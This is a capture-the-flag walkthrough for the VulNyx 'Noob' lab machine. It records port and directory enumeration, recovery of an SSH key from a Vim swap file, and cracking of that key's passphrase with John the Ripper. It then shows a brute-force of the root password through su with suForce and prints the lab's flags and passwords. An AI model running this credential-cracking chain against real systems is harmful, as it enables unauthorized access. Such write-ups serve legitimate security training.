# VulNyx - Noob

## Information
**Noob** is a low difficulty vulnerable Linux virtual machine from the VulNyx platform, it was created by user `mow` and works correctly on VirtualBox and VMware hypervisors.

## Solution
### Enumeration
**Nmap**
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 192.168.100.146     
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-17 16:32 +07
Nmap scan report for noob.lan (192.168.100.146)
Host is up (0.0026s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:79:17:1C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.78 seconds
```

We use the `gobuster` command to enumerate hidden directories and files on the target web server.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -x html,php,txt,bak,zip,xml,json,js,md,log,sh,css -u http://192.168.100.146 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.146
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,bak,xml,json,js,md,sh,css,php,txt,zip,log
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/notes.txt            (Status: 200) [Size: 101]
```
An unusual `notes.txt` file has been detected and needs cheking.
![notes.txt](/walkthroughs/vulnyx/low-difficulty/noob/web-notes.png)
This suggests that the user `diego` was configuring SSH, but accidentally closed the editor (may be **Vim**) without saving.

The **Vim** text editor, common to Linux/UNIX systems, creates a temporary file while a document is being  edited. The temporary file has the `swp` file extension, and the name of the file is the same as the file being edited by **Vim**.

In this scenario, the temp file's name is `id_rs` (the default name for SSH private keys), so the file we're looking for is named `id_rsa.swp`.
![id_rsa](/walkthroughs/vulnyx/low-difficulty/noob/id-rsa.png)

### Shell (diego)
We copy the contents of the`id_rsa` file (we just found it) and create file `id_rsa` in the Kali machine
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nano id_rsa             
                                                                           
┌──(dungcngo㉿kali)-[/tmp]
└─$ ls
config-err-P11Xeb
id_rsa
systemd-private-bbfa9993931a445cadb85c3c43528c7b-colord.service-KOqKVz
systemd-private-bbfa9993931a445cadb85c3c43528c7b-haveged.service-ifN5Ti
systemd-private-bbfa9993931a445cadb85c3c43528c7b-ModemManager.service-u7CoTC
systemd-private-bbfa9993931a445cadb85c3c43528c7b-pcscd.service-9EIHSi
systemd-private-bbfa9993931a445cadb85c3c43528c7b-polkit.service-PTDMGK
systemd-private-bbfa9993931a445cadb85c3c43528c7b-systemd-logind.service-frRxGj
systemd-private-bbfa9993931a445cadb85c3c43528c7b-upower.service-SeqwxM
```
Checking the access permissions of the `id_rsa` file.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ls -la
total 16
drwxrwxrwt 13 root     root      360 Apr 20 11:13 .
drwxr-xr-x 19 root     root     4096 Apr 10 10:14 ..
-rw-------  1 dungcngo dungcngo    0 Apr 18 11:12 config-err-P11Xeb
drwxrwxrwt  2 root     root       40 Apr 18 11:12 .font-unix
drwxrwxrwt  2 root     root       60 Apr 18 11:12 .ICE-unix
-rw-rw-r--  1 dungcngo dungcngo 1743 Apr 20 11:13 id_rsa
```
Currently, it allows read/write access only for the user and group, but other can read it, which is insecure. Change the permissions to `600` so only the owner can read/write.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ chmod 600 id_rsa 
                                                                           
┌──(dungcngo㉿kali)-[/tmp]
└─$ ls -la
total 16
drwxrwxrwt 13 root     root      360 Apr 20 11:13 .
drwxr-xr-x 19 root     root     4096 Apr 10 10:14 ..
-rw-------  1 dungcngo dungcngo    0 Apr 18 11:12 config-err-P11Xeb
drwxrwxrwt  2 root     root       40 Apr 18 11:12 .font-unix
drwxrwxrwt  2 root     root       60 Apr 18 11:12 .ICE-unix
-rw-------  1 dungcngo dungcngo 1743 Apr 20 11:13 id_rsa
```
Convert the SSH private key file (`id_rsa`) to a hash format that **John the Ripper** can understand and use for brute-force attacks.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh2john id_rsa > diego.hash

┌──(dungcngo㉿kali)-[/tmp]
└─$ cat diego.hash      
id_rsa:$sshng$0$8$5FB6DAB10833FB47$1192$c32c747274276c3f22ae780b2ba3b9d8296284124f4caa636d076a7c1fc06c8972042b66d000226f9123e951fd50c2b21441457a68223765a9c73def3eae91238ef404bfb60576ea84edf2346c029261e24ad590f009615dd87ecf970ff31a13ff7c13cd742c08c4f6b02c2f3acd90a0a5d313377c445e92aa30f66a66d293364c0a8a3e7581f0e3ed8f9db5225ebdec55226c3718a8b8dbbdb944fe329bcac9fbe95b58df13f95cc846161c58659488f22d8aa664312e9a17ccbb74368e2edc5e302ece06a93f5d7eb929f314b428f03ad276686660957ec58a4a06240b01972c8b04f3bb2633d02421a556bbcfd3faae86fecb39701bfedeac68c36fac20fd42700dc8cf9fe4fd98fad4d1f643175de224d1bdb04d0e1bcd2177a4303e21499a55bef9f2c4b584c2fb0bf9e908863e50d99f8c83ce20014674716231c99cfbf1663a5916afb584c73a384c88b2dd367cdfc2d10ea866d61d2e579bd79fe38655f580a1fbd0bf1af1e726826998692df590c747c198a753cc079783dcadff3c59eef55a4ae4164b8f945d9a7cb0de8584a5271793d9c27e1fd946904b1f18be09b684f8bb28ec4448aa0b4437065b03edf038b7893baaec6af6ae80e5825073ca432963ba7ffa680d3047c5e2b852bcf087880c8cb5b1b88993a6f1b79b276967c15d3203bf03259aed9abc0c00846680f163a216c30276bdc692ade995065036be442a66c1b50dfdb00e57c5fbf3f43cc50d0c3b21471f762079f38a733e00cdc78a5c43295d6fc23323389247d5b95bd6c3481d44fce4ff741309f93448040029777cafc690e53d297d2019f917c265aaac591e9624c4846a62eecf63e584af6eae1f4eccf1aadf14b8cfe075351fec63c908e7bf877a2e7739f2b4dea3d8de99d7948e186da3f3ec547e001b5bff88c6e09da55a865844a44c9ed57dbc51b0aab75350149be7cbad0e93f7e348cc746eaadb3d11750c9178e80c8b18e7a658534e2839eceebc3ce0cbf1b154d78278b0c4a3cfc863bec78e84313f76be01f132147dbac78255805e374574aa77218beb622a02399d36744cf755d925463b9cdb274f260399068064b6362907e2610914578abab06566730cccfabc9300840996661ba3e382299820e19c4e8e87cc6b17750e1c476c2fd8d8276407ad0df5f25d4122aa62318f2bb74323f2417afae9869fa9e9930378ff28111af223c99768b75531657755cbd1e95b3fc76fe8808e84067d4203654ea284ed57bef32911c3703954d879a239244d097bf02c38b4a8f2c9441c1213ec303200c02ac53e62fe62b47abba4291eab331bbc3e84e64172bc78578b6626623e0460f8b3f0e60f772c3b686f1bf2d202468611377163147e64875fcf5d639fd5395b74799813abcd829a019ab34d7c4cd3eb3799c4a5e3131247559deff7eeeb84f5d465ab0e368819ae6f70f5f38f48c16b55d359b2b66cad602e91f1bec02295773cb9bc0bcb6c779f1e010ce590bcbf8f8a83b9ec16333a0c75a7e72fa515bd794d8a6d580a59efed945871a1bb76b5959bf14851a28b01231c196c0a8f0806c44844aada7ba469b90855966d5f459a9fd3216ebf65b62a350632a0a29f19ffee8eeb63f7779796627a2e33c03921653581fa266d689eda49427a08a25be6c4ed6bb1ea49282eb46017f34028de
```
Run the command **John the Ripper** `john` to brute-force `diego.hash` and use wordlist `rockyou.txt`. 
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt diego.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sandiego         (id_rsa)     
1g 0:00:00:02 DONE (2026-04-20 11:27) 0.3952g/s 1252p/s 1252c/s 1252C/s starbucks..heaven1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Private key `id_rsa` has passphrase: `sandiego`.

Login the target machine with username `diego` using SSH and use the private key `id_rsa` for authentication.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh -i id_rsa diego@192.168.100.146  
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa': 
Linux noob 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64
Last login: Mon May 22 13:56:42 2023 from 192.168.1.10
diego@noob:~$ id; hostname
uid=1000(diego) gid=1000(diego) grupos=1000(diego)
noob
```

### Privilege Escalation
#### Enumeration
Use the command `cat /etc/password` to check the file containing information about user account on the system.
```bash
diego@noob:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
diego:x:1000:1000:diego,,,:/home/diego:/bin/bash
```
We use `suForce` and a wordlist of the first 5000 passwords in `rockyou.txt` to brute-force user `root`'s password.
```bash
diego@noob:/tmp$ ls
rockyou5000.txt
suForce
systemd-private-7828b46b2906464684393d0d4a063de2-apache2.service-jmIETf
systemd-private-7828b46b2906464684393d0d4a063de2-systemd-logind.service-S1CAGg
systemd-private-7828b46b2906464684393d0d4a063de2-systemd-timesyncd.service-K9oVkj
diego@noob:/tmp$ ./suForce 
            _____                          
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
 ❓  Usage: suForce [OPTIONS]

 🌐  Get a user password with the su binary.

 📋  Options:
       -u <USER>      Specify the username you want to attack.
       -w <WORDLIST>  Specify the path where the wordlist is located.
       -h             Display this help message and exit.

 💡  Examples:
       suForce -u root -w rockyou.txt
       suForce -h 

───────────────────────────────────
```

```bash
diego@noob:/tmp$ ./suForce -u root -w rockyou5000.txt 
            _____                          
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
🎯 Username | root
📖 Wordlist | rockyou5000.txt
🔎 Status   | 3267/5000/65%/rootbeer
💥 Password | rootbeer
───────────────────────────────────
```
User `root`'s password is `rootbeer`.
```bash
diego@noob:/tmp$ su
Contraseña: 
root@noob:/tmp# id; hostname
uid=0(root) gid=0(root) grupos=0(root)
noob
```
#### Flags
```bash
root@noob:/tmp# cd ~
root@noob:~# find / -name root.txt -o -name user.txt | xargs cat
5d12e0bbb9e9b426ec9e945d440d8288
cd02a5a828de0812a6e3552ec8740a5e
```

***You are welcome!***
